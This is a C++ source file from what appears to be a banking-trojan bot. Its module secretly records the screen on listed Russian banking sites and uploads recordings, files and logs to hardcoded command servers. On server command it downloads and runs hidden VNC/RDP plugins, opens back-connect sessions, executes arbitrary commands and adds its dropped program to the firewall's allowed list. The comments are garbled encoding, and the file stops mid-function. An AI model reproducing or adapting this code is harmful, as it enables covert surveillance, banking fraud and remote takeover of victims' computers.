#include "VideoRecorder.h"
#include "BotCore.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "Pipes.h"
#include "Inject.h"
#include "StrConsts.h"
#include "plugins.h"
#include "BackConnect.h"
#include "Task.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace VIDEORECDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define VDRDBG VIDEORECDEBUGSTRINGS::DBGOutMessage<>

//----------------------------------------------------------------------------


/// ������ ������������� �������. � ������ ������� ����� ������ �������������
//  ������� ����
#ifndef DEBUGCONFIG
	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = VIDEOREC_PARAM_NAME_URLS;
#else
	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = "*bsi.dll*\0"
												  "*ibank.alfabank.ru*\0"
												  "*avangard.ru*\0\0";
#endif


#define HASH_VIDEO_REC_URLS 0x9189212B /* VIDEO_REC_URLS */


#ifdef DEBUGCONFIG
//	char VIDEO_REC_HOST1[] = "178.162.179.65";
//	char VIDEO_REC_HOST2[] = "188.72.202.163";

//	char VIDEO_REC_HOST1[] = "127.0.0.1";
//	char VIDEO_REC_HOST2[] = "127.0.0.1";
	char VIDEO_REC_HOST1[] = "192.168.0.100";
	char VIDEO_REC_HOST2[] = "192.168.0.100";
//	char VIDEO_REC_HOST1[] = "178.162.179.65";
//	char VIDEO_REC_HOST2[] = "178.162.179.65";
//	char VIDEO_REC_HOST1[] = "192.168.147.2";
//	char VIDEO_REC_HOST2[] = "193.106.161.242";
#else
	//����� ������� ���� ����� �����
	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
	char VIDEO_REC_HOST2[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST2;
#endif


#define HASH_VIDEO_REC_HOST 0x922E6EAC /* VIDEO_REC_HOST */


namespace VideoRecorder
{
	// ���������� ��� ����������
	#include "VideoRecorderDll.cpp"
}


//*****************************************************************************
//                                    TVideoRecDLL
//*****************************************************************************
TVideoRecDLL::TVideoRecDLL()
	: TMemoryDLL(VideoRecorder::data)
{
	// ��������� ���������� � �������������� ���
	InitializeApi();
}
//-------------------------------------------------------------------

TVideoRecDLL::~TVideoRecDLL()
{

}
//-------------------------------------------------------------------

void TVideoRecDLL::LoadFunc(const char* Name, LPVOID &Addr)
{
	// ������� ��������� ������� ����������
	// ������� ����������� �� ��, ��� ������ Name �����������
	Addr = GetProcAddress(GetStr(Name));
}
//-------------------------------------------------------------------

void TVideoRecDLL::InitializeApi()
{
	LoadFunc(VideoRecFuncInit,			(LPVOID&)Init);
	LoadFunc(VideoRecFuncRelease,		(LPVOID&)Release);
	LoadFunc(VideoRecUpdateSettings,	(LPVOID&)UpdateSettings);
	LoadFunc(VideoRecFuncAddIPServer,	(LPVOID&)AddIPServer);
	LoadFunc(VideoRecFuncRecordProcess,	(LPVOID&)RecordProcess);
	LoadFunc(VideoRecFuncRecordWnd,		(LPVOID&)RecordWnd);
	LoadFunc(VideoRecFuncStop,			(LPVOID&)RecordStop);
	LoadFunc(VideoRecFuncResetTime,		(LPVOID&)ResetTime);
	LoadFunc(VideoRecFuncSendFiles,		(LPVOID&)SendFiles);
	LoadFunc(VideoRecFuncSendFilesAsync,(LPVOID&)StartSendAsync);
	LoadFunc(VideoRecFuncIsSendedAsync,	(LPVOID&)IsSendedAsync);
	LoadFunc(VideoRecFuncRunCmdExec,	(LPVOID&)RunCmdExec);
	LoadFunc(VideoRecFuncSendLog,		(LPVOID&)SendLog);
	LoadFunc(VideoRecFuncFolderIsUpload,(LPVOID&)FolderIsUpload);
	LoadFunc(VideoRecOutOfHibernation,	(LPVOID&)OutOfHibernation);
}

//*********************************************************************************
//							VideoSendLog
//*********************************************************************************
//�������� ���� �� ������:
//name - ��� ����
//code - ��� ����
//format - ��������������� ����� ����
void VideoLog::Send( const char* name, int code, const char* format, ... )
{
	if( format != 0 )
	{
		va_list va;
		va_start( va, format );
		SendV( name, code, format, va );
		va_end(va);
	}
	else
		Send2( name, code, format );
}

void VideoLog::SendV( const char* name, int code, const char* format, va_list va )
{
	char buf[1024];
	pwvsprintfA( buf, format, va );
	Send2( name, code, buf );
}

void VideoLog::Send( int code, const char* format, ... )
{
	va_list va;
	va_start( va, format );
	SendV( name, code, format, va );
	va_end(va);
}

void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
{
	// ��������� ����� � �������� �, � ������ �������, ��������� ������
	if (CalcHash(VIDEO_REC_URLS) == HASH_VIDEO_REC_URLS)
		return;

	PCHAR URL = NULL;

	if (!STR::IsEmpty((PCHAR)Data))
	{
		PCHAR Temp = VIDEO_REC_URLS;
		while (*Temp != 0)
		{
			if (CompareUrl(Temp, (PCHAR)Data))
			{
				URL = Temp;
				break;
			}

			//--------------------
			Temp = STR::End(Temp); // ��������� � ����� ������
			Temp++;                // ���������� ������� ������
		}
    }


	if (URL != NULL)
	{
		VideoProcess::RecordPID( 0, URL );
	}
	else
	{
		VideoProcess::RecordStop();
	}
}


void StartVideoFromCurrentURL()
{
	#ifdef UniversalKeyLoggerH
 		VDRDBG("VideoRecorder", "�������������� ������������� ��� ������ ��� ������ �������");

		KeyLogger::Initialize(NULL);
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::Start();
	#endif
}

PCHAR GetVideoRecHost1()
{
	//������� ���������� ����� ������� ��� ������ �����
	if (CalcHash(VIDEO_REC_HOST1) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST1;
}

PCHAR GetVideoRecHost2()
{
	//������� ���������� ����� ������� ��� ������ �����
	if (CalcHash(VIDEO_REC_HOST2) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST2;
}



bool SaveVideoDll( const char* nameFile )
{
	void* dataDll;
	DWORD sizeDll;
	bool neededDel;
	if( TMemoryDLL::DecodeDll( VideoRecorder::data, sizeDll, dataDll, neededDel ) )
	{
		bool res = File::WriteBufferA( (char*)nameFile, dataDll, sizeDll ) > 0;
		if( neededDel ) MemFree(dataDll);
		return res;
	}
	return false;
}

/////////////////////////////////////////////////////////////////////////////
//						VideoProcess
/////////////////////////////////////////////////////////////////////////////

namespace VideoProcess
{

TVideoRecDLL* dll; //��������� ����
PProcessPipe pipe; //����� �����
const int MaxServers = 10; //������������ ���������� ������������ ���������� �������� 
DWORD servers[MaxServers];

DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );

//������������� (������) ������ ��������� 
struct MsgInit
{
	char ip[24];
	int port;
	int flags;
	int downtime; //����� ����������� ����� �������� �������� ������ � ����� ������
	int numServer; //����� ������� (������ � servers), 
};

static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(VideoProcess::MsgInit) ) 
		return;
	MsgInit* mi = (MsgInit*)Message->Data;
	VDRDBG( "Video", "init server: ip: %s:%d, downtime %d", mi->ip, mi->port, mi->downtime );
	int num = -1;
	for( int i = 0; i < MaxServers; i++ ) //���� ��������� ����� � ������� ��������
		if( servers[i] == 0 )
			num = i;
	if( num >= 0 )
	{
		DWORD id = dll->Init( Bot->UID().t_str(), mi->flags, mi->ip, mi->port, mi->downtime );
		if( id )
		{
			int i = 0;
			for( ; i < MaxServers; i++ ) //������� ����� ��� ��������������� ����� ������
				if( servers[i] == id )
				{
					num = i;
					break;
				}
			if( i >= MaxServers ) //����� ������ �� ���������
			{
				servers[num] = id;
				if( mi->flags & TVideoRecDLL::RunCallback )
					dll->RunCmdExec( id, CallbackCmd ); //������ ������ ���������� ������ �� �������
			}
		}
		else
			num = -1;
	}
	mi->numServer = num;
}

int Init( int flags, const char* ip, int port, int downtime )
{
	MsgInit msg;
	SafeCopyStr( msg.ip, sizeof(msg.ip), ip );
	if( msg.ip[0] == 0 ) //������ �� ������ ����� �� ���������
		m_lstrcpy( msg.ip, VIDEO_REC_HOST1 );
	msg.port = port == 0 ? VIDEORECORD_DEFAULT_PORT : port;
	msg.flags = flags;
	msg.downtime = downtime;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncInit).t_str(), (char*)&msg, sizeof(msg), 0 );
	return msg.numServer;
}

//���������� �������� �������
struct MsgUpdateSettings
{
	int setFlags;
	int resetFlags;
	int downtime;
	int numServer;
};

static void WINAPI HandlerUpdateSettings( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(VideoProcess::MsgUpdateSettings) ) 
		return;
	MsgUpdateSettings* msg = (MsgUpdateSettings*)Message->Data;
	VDRDBG( "Video", "Update settings: setFlags: %08x, resetFlags: %08x, downtime: %d", msg->setFlags, msg->resetFlags, msg->downtime );
	if( dll )
	{
		if( dll->UpdateSettings )
			dll->UpdateSettings( servers[msg->numServer], msg->setFlags, msg->resetFlags, msg->downtime );
	}
}

void UpdateSettings( int server, int setFlags, int resetFlags, int downtime )
{
	MsgUpdateSettings msg;
	msg.numServer = server;
	msg.setFlags = setFlags;
	msg.resetFlags = resetFlags;
	msg.downtime = downtime;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecUpdateSettings).t_str(), (char*)&msg, sizeof(msg), 0 );
}

//��������� ��� ������ �����
struct MsgRecordVideo
{
	char nameVideo[128]; //��� �����
	HWND wnd; //���� != 0, �� ������ ���������� ����
	DWORD pid; //���� != 0, �� ������ � ���� ���������� ��������
	int flags; //0x0001 - ������������� ������, 0x0002 - ���������� ������, ���� ���� ���� �� �������
	int seconds; //������� ������ ������ �����
	int numServer;
};
//������� ���������� �������� ������ �����
static void WINAPI HandlerRecordVideo( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(VideoProcess::MsgRecordVideo) ) 
		return;
	MsgRecordVideo* msg = (MsgRecordVideo*)Message->Data;
	VDRDBG( "Video", "start name video: %s, wnd: %08x, pid: %08x", msg->nameVideo, msg->wnd, msg->pid );
	if( dll )
	{
		if( msg->wnd )
			dll->RecordWnd( servers[msg->numServer], Bot->UID().t_str(), msg->nameVideo, msg->wnd, msg->seconds, msg->flags );
		else if( msg->pid )
			dll->RecordProcess( servers[msg->numServer], Bot->UID().t_str(), msg->nameVideo, msg->pid, msg->seconds, msg->flags );
	}
}

bool RecordHWND( int server, const char* name, HWND wnd, int seconds, int flags )
{
	MsgRecordVideo msg;
	SafeCopyStr( msg.nameVideo, sizeof(msg.nameVideo), name );
	msg.wnd = wnd;
	msg.pid = 0;
	msg.flags = flags;
	msg.seconds = seconds;
	msg.numServer = server;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncRecordWnd).t_str(), (char*)&msg, sizeof(msg), 0 );
	return true;
}

bool RecordPID( int server, const char* name, DWORD pid, int seconds, int flags )
{
	MsgRecordVideo msg;
	SafeCopyStr( msg.nameVideo, sizeof(msg.nameVideo), name );
	msg.wnd = 0;
	if( pid == 0 ) pid = GetUniquePID();
	msg.pid = pid;
	msg.flags = flags;
	msg.seconds = seconds;
	msg.numServer = server;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncRecordWnd).t_str(), (char*)&msg, sizeof(msg), 0 );
	return true;
}

//������� ���������� ������������� ������ �����
static void WINAPI HandlerStopRecord( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	VDRDBG( "Video", "stop video" );
	if( dll )
		dll->RecordStop();
}

void RecordStop()
{
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncStop).t_str() );
}

///////////////////////////////////////////////////////////////////////////////////////
//��������� ��� ������ ������
struct MsgSendFiles
{
	char name[MAX_PATH]; //��� ������
	char path[MAX_PATH]; //��� ����� ��� ����� ������� ����� ��������
	int numServer;
	int flags; //1 - �������� ����� ����� ��������
	int after; //����� ������� ������ ������ ��������
	DWORD id; //������������� �������� (��� �������� � ����������� ��������)
};

//�������� �������� ������ �� ������
static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
	VDRDBG( "Video", "Start send files %s, %s", msg->name, msg->path );
	if( dll )
		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->name, msg->path, msg->flags, msg->after );
}

//�������� �� ������� ������ �������
static void WINAPI HandlerFolderIsUpload( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
	VDRDBG( "Video", "FolderIsUpload: name: %s, folder: %s", msg->name, msg->path );
	if( dll )
		msg->id = dll->FolderIsUpload( msg->name, msg->path );
}

DWORD SendFiles( int server, const char* name, const char* path, int flags, int after, bool async )
{
	MsgSendFiles msg;
	SafeCopyStr( msg.name, sizeof(msg.name), name );
	SafeCopyStr( msg.path, sizeof(msg.path), path );
	msg.numServer = server;
	msg.flags = flags;
	msg.after = after;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendFilesAsync).t_str(), (char*)&msg, sizeof(msg), &msg );
	if( async )
		return msg.id;
	else
	{
		while( !FilesIsSended(msg.id) ) pSleep(1000);
	}
	return 0;
}

bool FolderIsUpload( const char* name, const char* folder )
{
	MsgSendFiles msg;
	SafeCopyStr( msg.name, sizeof(msg.name), name );
	SafeCopyStr( msg.path, sizeof(msg.path), folder );
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncFolderIsUpload).t_str(), (char*)&msg, sizeof(msg), &msg );
	if( msg.id )
		return true;
	return false;
}
//////////////////////////////////////////////////////////////////
//�������� ��������� �������� ������
struct MsgFilesIsSended
{
	DWORD id;
	DWORD res;
};

//��������� ����������� �� �������� ������
static void WINAPI HandlerFilesIsSended( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgFilesIsSended) ) return;
	MsgFilesIsSended* msg = (MsgFilesIsSended*)Message->Data;
//	VDRDBG( "Video", "HandlerFilesIsSended %08x", msg->id );
	if( dll )
		msg->res = dll->IsSendedAsync( msg->id );
}

bool FilesIsSended(DWORD id)
{
	MsgFilesIsSended msg;
	msg.id = id;
	msg.res = FALSE;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncIsSendedAsync).t_str(), (char*)&msg, sizeof(msg), &msg );
	return msg.res != 0;
}

struct MsgSendLog
{
	char name[128]; //��� ����
	int code; //���� ������ ����
	char text[4096 - 256]; //����� ���� (�������� ������� ������ ��-�� ����������� �������� ������������ �� ������ �������)
	int numServer;
};

//������� ���� �� ������
static void WINAPI HandlerSendLog( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgSendLog) ) return;
	MsgSendLog* msg = (MsgSendLog*)Message->Data;
	VDRDBG( "Video", "HandlerSendLog %s, %d, %s", msg->name, msg->code, msg->text );
	if( dll )
		dll->SendLog( servers[msg->numServer], msg->name, msg->code, msg->text );
}

static DWORD WINAPI SendLogThread( void* msg )
{
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendLog).t_str(), (char*)msg, sizeof(MsgSendLog), 0 );
	MemFree(msg);
	return 0;
}

//��� ���������� � ��������� ������, ����� �� ���� ��������
bool SendLog( int server, const char* name, int code, const char* text )
{
	MsgSendLog* msg = (MsgSendLog*)MemAlloc( sizeof(MsgSendLog) );
	SafeCopyStr( msg->name, sizeof(msg->name), name );
	msg->code = code;
	SafeCopyStr( msg->text, sizeof(msg->text), text );
	msg->numServer = server;
	RunThread( SendLogThread, msg );
	return true;
}

struct MsgOutOfHibernation
{
	int numServer;
};

//������� ���� �� ������
static void WINAPI HandlerOutOfHibernation( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgOutOfHibernation) ) return;
	MsgOutOfHibernation* msg = (MsgOutOfHibernation*)Message->Data;
	VDRDBG( "Video", "OutOfHibernation" );
	if( dll )
		dll->OutOfHibernation( servers[msg->numServer] );
}

static DWORD WINAPI OutOfHibernationThread( void* msg )
{
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecOutOfHibernation).t_str(), (char*)msg, sizeof(MsgOutOfHibernation), 0 );
	MemFree(msg);
	return 0;
}

//����� ����� ��� �� ������, �������� � �������� ������, ����� �� ���� ��������
void OutOfHibernation( int server )
{
	MsgOutOfHibernation* msg = (MsgOutOfHibernation*)MemAlloc( sizeof(MsgOutOfHibernation) );
	msg->numServer = server;
	RunThread( OutOfHibernationThread, msg );
}

DWORD WINAPI ProcessRDP(void*)
{
	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);

	BOT::Initialize(ProcessUnknown);
	VDRDBG( "Video", "������� ������� RDP" );
	DWORD c_data;
	BYTE* data = Plugin::Download( "rdp.plug", 0, &c_data, false );
	//BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
	if( data )
	{
		VDRDBG( "Video", "RDP ������ ��������" );
		HMEMORYMODULE module = MemoryLoadLibrary(data);
		if( module )
		{
			PINIT Init = (PINIT)MemoryGetProcAddress( module, "Init" );
			PSTART Start = (PSTART)MemoryGetProcAddress( module, "Start" );
			PSTOP Stop = (PSTOP)MemoryGetProcAddress( module, "Stop" );
			PTakeBotGuid TakeBotGuid = (PTakeBotGuid)MemoryGetProcAddress( module, "TakeBotGuid" );
			if( Init )
			{
				VDRDBG( "Video", "Init RDP" );
				Init(GetStr(RDPRunParam).t_str());
				HANDLE mutex = CaptureMutex( "RDP", 10000 ); //�������� ��� RDP ����������
				VDRDBG( "Video", "RDP before start" );
				Start();
				VDRDBG( "Video", "RDP after start" );
				if( mutex )
				{
					for(;;) // ���� ������� �� ����������
					{
						HANDLE tmp;
						tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
						if ((DWORD)pWaitForSingleObject( tmp, INFINITE ))
							pSleep(100);
						else
							break;
					}
					pCloseHandle(mutex);
				}
				Stop();
				VDRDBG( "Video", "Stop RDP" );
				MemoryFreeLibrary(module);
			}
		}
		MemFree(data);
	}
	return 0;
}

DWORD WINAPI ProcessVNC(void*)
{
	BOT::Initialize(ProcessUnknown);

	VDRDBG("Video", "������� ������� VNC. PID %d", Bot->PID());

	DWORD c_data;
	BYTE* data = Plugin::Download( "vnc.plug", 0, &c_data, false );

//	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
	if( data )
	{
		VDRDBG( "Video", "vnc.plug downloaded");
		char fileName[MAX_PATH];
		File::GetTempName(fileName);
		if( File::WriteBufferA(fileName, data, c_data) == c_data)
		{
			AddAllowedprogram(fileName); //��������� � ������ �����������
			VDRDBG( "Video", "vnc.plug saved in %s", fileName );
			if( RunFileA(fileName))
			{
				pMoveFileExA( fileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
				pSleep(20000); //���� 20 � ���� ���������� vnc
				HANDLE mutex = CaptureMutex( "VNC", 10000 ); //�������� ��� VNC ����������
				if( mutex )
				{
					while (true)
					{
						//VDRDBG( "Video", "VNC worked" );
						pSleep(10000);
					}
					pCloseHandle(mutex);
				}
			}
			else
				pDeleteFileA(fileName);
		}
		MemFree(data);
	}
	else
	{
        VDRDBG( "Video", "vnc.plug download error");
	}

				/*
				HMEMORYMODULE module = MemoryLoadLibrary(data);
				if( module )
				{
					TASKDBG( "Task", "Exit HVNC" );
					MemoryFreeLibrary(module);
				}
				*/
	pExitProcess(0);
	return 0;
}

struct VNCDLL_CONTEXT
{
	ULONGLONG	pModule32;	// ��������� �� ����������� � ������ ����, ���������� 32�-������ ������ DLL
	ULONGLONG	pModule64;	// ��������� �� ����������� � ������ ����, ���������� 64�-������ ������ DLL
	ULONG		Module32Size;	// ������ ����� 32�-������ DLL
	ULONG		Module64Size;	// ������ ����� 64�-������ DLL
};

DWORD WINAPI ProcessVNC2(void*)
{
	BOT::Initialize(ProcessUnknown);

	VDRDBG("Video", "������� ������� VNCDLL. PID %d", Bot->PID());

	DWORD c_data;
	BYTE* data = Plugin::Download( "vncdll.plug", 0, &c_data, false );

//	BYTE* data = File::ReadToBufferA( "c:\\vncdll.dll", c_data );
	if( data )
	{
		VDRDBG( "Video", "vncdll.plug downloaded");
		VNCDLL_CONTEXT param;
		param.pModule32 = (ULONGLONG)data;
		param.pModule64 = 0;
		param.Module32Size = c_data;
		param.Module64Size = 0;
		HMEMORYMODULE module = MemoryLoadLibrary( data, true, &param );
		if( module )
		{
			VDRDBG( "Video", "VNCDLL is run" );
			pSleep(10000); //���� 20 � ���� ���������� vnc
			HANDLE mutex = CaptureMutex( "VNCDLL", 10000 ); //�������� ��� VNC ����������
			if( mutex )
			{
				while (true)
				{
//					VDRDBG( "Video", "VNCDLL worked" );
					pSleep(10000);
				}
				pCloseHandle(mutex);
			}
		}
		MemFree(data);
	}
	else
	{
        VDRDBG( "Video", "vncdll.plug download error");
	}
	pExitProcess(0);
	return 0;
}

//���������� ������ �� ����� ���
//server - ��� �� ����� ������� � ������� servers, ��� �� �������, ������������ ���, ���� ����� �����
//�������, �� ����� �������� �� ������� servers � ����� ������
DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData )
{
	DWORD res = 0;
	switch( cmd )
	{
		case 21: //�������� � ������ RDP
			VDRDBG( "Video", "RDP" );
			if( WaitCaptureMutex( "RDP", 100 ) ) //����� ��� ��� �������
				outData[0] = 1;
			else
			{
				MegaJump(ProcessRDP);
				if( WaitCaptureMutex( "RDP", 2 * 60 * 1000 ) )
				{
					pSleep(10000); //���� ������������� ���� ��������� RDP
					outData[0] = 1;
					VDRDBG( "Video", "RDP is start" );
				}
				else
				{
					VDRDBG( "Video", "RDP not start" );
					outData[0] = 0;
				}
			}
			res = TRUE;
			break;
		case 22: //�������� � ������ VNC
			VDRDBG( "Video", "VNC" );
			if( WaitCaptureMutex( "VNC", 100 ) ) //����� ��� ��� �������
				outData[0] = 1;
			else
			{
				MegaJump(ProcessVNC);
				if( WaitCaptureMutex( "VNC", 2 * 60 * 1000 ) )
				{
					VDRDBG( "Video", "VNC is start" );
					outData[0] = 1;
				}
				else
				{
					VDRDBG( "Video", "VNC not start" );
					outData[0] = 0;
				}
			}
			res = TRUE;
			break;
		case 28: //�������� � ������ VNCDLL
			VDRDBG( "Video", "VNCDLL" );
			if( WaitCaptureMutex( "VNCDLL", 100 ) ) //����� ��� ��� �������
				outData[0] = 1;
			else
			{
				MegaJump(ProcessVNC2);
				if( WaitCaptureMutex( "VNCDLL", 2 * 60 * 1000 ) )
				{
					VDRDBG( "Video", "VNCDLL is start" );
					outData[0] = 1;
				}
				else
				{
					VDRDBG( "Video", "VNCDLL not start" );
					outData[0] = 0;
				}
			}
			res = TRUE;
			break;
		case 23: //������ BC (back connect)
			{
				VDRDBG( "Video", "BC" );
				int len = (inData[1] << 8) | inData[0];
				char* args = inData + 2;
				args[len] = 0;
				VDRDBG( "Video", "BC %s", args );
				if( ExecuteBackConnectCommand( 0, 0, args) )
					outData[0] = 1;
				else
					outData[0] = 0;
//				if( inData && lenInData == sizeof(SOCKET) ) //� inData ��������� �����
//					RunThread( StartBCSessionWork, inData );
			}
			break;
		case 27: //������� ����
			if( lenInData > 2 )
			{
				int len = (inData[1] << 8) | inData[0];
				TMemory cmd(len);
				char* p = cmd.AsStr();
				m_memcpy( p, inData + 2, len );
				p[len] = 0;
				VDRDBG( "Video", "�������� ������ �������: '%s', �����: %d", p, len );
				char* p2 = STR::Scan( p, ' ' );
				char* args;
				if( p2 )
				{
					*p2 = 0; //��������� ������� � ���������
					args = p2 + 1;
					if( *args == ' ' ) args++;
				}
				else
					args = p + len; //������ ������
				VDRDBG( "Video", "�������� �������: '%s', ���������: '%s'", p, args );
				ExecuteCommand( 0, p, args );
			}
			break;
	}
	return res;
}

//����������� ������ ip:port, ���������� ����� ����� � ���� (���� ���� �� ������, �� ���� �� ���������)
static int GetPortIp( const char* adr, char* ip )
{
	char* p = STR::Scan( adr, ':' );
	int len;
	int port = VIDEORECORD_DEFAULT_PORT;
	if( p )
	{
		len = p - adr;
		port = m_atoi( p + 1 );
	}
	else
		len = m_lstrlen(adr);
	m_memcpy( ip, adr, len );
	ip[len] = 0;
	return port;
}

bool Start()
{
	dll = new TVideoRecDLL();
	//dll->SetNotFree(true);
	m_memset( servers, 0, sizeof(servers) );
	//��������� �������� ����� �������� � ������ ������, �. �. ����������� � �������� ����� ������ �� �������
	//��� ��� �������� ������
	char ip[128];
	int port = GetPortIp( VIDEO_REC_HOST1, ip );
	VDRDBG( "Video", "Start manager ip %s:%d", ip, port );
	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, ip, port, 0 );
	if( servers[0] )
	{
		VDRDBG( "Video", "�������� ���������������" );
		if( port != 80 )
			dll->AddIPServer( servers[0], ip, 80 ); //��������� ����� �� ������ �� ���������� ���� ����� 80-� ����
		port = GetPortIp( VIDEO_REC_HOST2, ip );
		dll->AddIPServer( servers[0], ip, port );
		VDRDBG( "Video", "Add server ip %s:%d", ip, port );
		char namePipe[64];
		pipe = PIPE::CreateProcessPipe( GetNamePipe(namePipe), false );
		if( pipe )
		{
			PIPE::RegisterMessageHandler( pipe, HandlerInit, 0, GetStr(VideoRecFuncInit).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerUpdateSettings, 0, GetStr(VideoRecUpdateSettings).t_str(), 0 );

			PIPE::RegisterMessageHandler( pipe, HandlerRecordVideo, 0, GetStr(VideoRecFuncRecordWnd).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerStopRecord, 0, GetStr(VideoRecFuncStop).t_str(), 0 );

			PIPE::RegisterMessageHandler( pipe, HandlerSendFiles, 0, GetStr(VideoRecFuncSendFilesAsync).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerFilesIsSended, 0, GetStr(VideoRecFuncIsSendedAsync).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerFolderIsUpload, 0, GetStr(VideoRecFuncFolderIsUpload).t_str(), 0 );

			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerOutOfHibernation, 0, GetStr(VideoRecOutOfHibernation).t_str(), 0 );

			dll->RunCmdExec( servers[0], CallbackCmd ); //������ ������ ���������� ������ �� �������

			if( PIPE::StartProcessPipe(pipe) )
			{
				VDRDBG( "Video", "���� ����� ������" );
				return true;
			}
			else
				PIPE::FreeProcessPipe(pipe);
		}
	}
	delete dll;
	return false;;
}

DWORD WINAPI StartSvchost(void*)
{
	BOT::Initialize();
	Start();
	#ifdef KeepAliveH
		// �������������� ������ ���������
		KeepAliveInitializeProcess(PROCESS_VIDEO);
	#endif
	while(true) pSleep(INFINITE);
}

char* GetNamePipe( char* buf )
{
	string s = GetStr(VideoRecPipe);
	m_lstrcpy( buf, s.t_str() );
	return buf;
}

void ConnectToServer( int server, bool autorun )
{
	bool connect = true;
	if( autorun )
	{
		string autorunFlag = BOT::MakeFileName( 0, GetStr(VideoRecOutOfHibernation).t_str() );
		if( !File::IsExists( autorunFlag.t_str() ) )
			connect = false;
	}
	if( connect )
	{
		VDRDBG( "Video", "���������� � ��������" );
		UpdateSettings( 0, 0, 0, 24 * 60 );
		OutOfHibernation(server);
	}
}

void SetAutorun( bool set )
{
	string autorunFlag = BOT::MakeFileName( 0, GetStr(VideoRecOutOfHibernation).t_str() );
	if( set )
		File::WriteBufferA( autorunFlag.t_str(), 0, 0 );
	else
		pDeleteFileA( autorunFlag.t_str() );
}

}

char* PathToName( const char* path, char* name, int szName )
{
	const char* bad = "\\/:'\" "; //������� ������� �������� �� _
	const char* p = path;
	char* n = name;
	int i = 0;
	while( *p && i < szName - 1 )
	{
		if( STR::Scan( bad, *p ) )
			*n = '_';
		else
			*n = *p;
		p++; n++; i++;
	}
	*n = 0;
	return name;
}

//��������� ��������� ���� � ������ ����������� ������������� �����
bool AddAllowedprogram( const char* pathExe )
{
	char name[64];
	//��������� ��� ������� �� ������ ����� exe
	char* pn1 = (char*)pPathFindFileNameA(pathExe);
	char* pn2 = (char*)pPathFindExtensionA(pathExe);
	int pnlen = pn2 ? pn2 - pn1 : m_lstrlen(pn1);
	if( pnlen >= sizeof(name) - 1 ) pnlen = sizeof(name) - 1;
	m_memcpy( name, pn1, pnlen );
	name[pnlen] = 0;

	//������ ������� ����������� ����� windows\system32\wbem, ��� ���� �����
	//������� ����������� ��� ������� �� ���� ������� (��� ����� �� ����� ����� ���������)
	char currDir[MAX_PATH], systemDir[MAX_PATH];
	pGetCurrentDirectoryA( sizeof(currDir), currDir );
	pGetSystemDirectoryA( systemDir, sizeof(systemDir) );
	pPathAppendA( systemDir, "wbem" );
	pSetCurrentDirectoryA(systemDir);

	//�� ������ windows �������� ������ �������
	char* cmdAdd = (char*)HEAP::Alloc(512);
